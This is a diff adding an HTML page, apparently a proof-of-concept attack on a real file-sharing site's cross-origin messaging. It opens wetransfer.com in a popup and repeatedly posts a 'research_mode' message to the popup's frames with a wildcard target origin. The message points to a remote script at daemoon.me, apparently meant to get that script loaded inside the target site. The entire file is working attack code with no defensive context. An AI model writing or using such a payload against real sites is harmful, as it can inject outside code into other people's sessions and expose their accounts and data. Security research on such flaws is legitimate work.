@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>postMessage demo with open window</title>
+</head>
+<body>
+  <button id="send">Open Page and Send Message</button>
+
+  <script>
+    const url = "https://wetransfer.com";
+    let popup;
+
+    document.getElementById("send").addEventListener("click", () => {
+      popup = window.open(url);
+
+      const payload = JSON.stringify({
+                command: "research_mode",
+                data: ["https://daemoon.me/poc.js"]
+                });
+
+      function sendToAllIframes() {
+        // if (!popup || popup.closed) {
+        //   console.log('Popup is closed or not available');
+        //   return;
+        // }
+
+        try {
+            for (var i = 0; i < 10; i++) {
+                try { 
+                    popup.frames[i].postMessage(payload, '*'); } 
+                catch(e) {}
+            }
+        } catch (e) {
+          console.log('Failed to send to popup:', e);
+        }
+      }
+
+      // Wait for popup to load, then start sending messages
+      setTimeout(() => {
+        sendToAllIframes();
+        // Continue sending every second
+        setInterval(sendToAllIframes, 1000);
+      }, 1000);
+    });
+  </script>
+</body>
+</html>
